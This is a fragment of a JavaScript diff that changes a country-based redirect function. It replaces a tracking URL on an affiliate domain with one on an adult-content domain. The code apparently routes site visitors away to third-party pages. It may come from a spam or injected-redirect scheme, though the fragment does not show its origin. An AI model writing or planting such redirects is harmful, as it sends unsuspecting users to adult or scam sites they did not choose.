@@ -12,7 +12,7 @@
 
     // Function to redirect the user to site2.ru
     function checkCountry2() {
-        window.location.href = "https://pwkax.bestafair.com/?utm_source=da57dc555e50572d&&ban=other&j1=1&s1=4375&s2=2108611&s3=" + source;
+        window.location.href = "https://dbrpmrq.youradultplay.com/uw22cmz?s1=" + source;
     }
 
     // Function to handle errors when fetching the country data
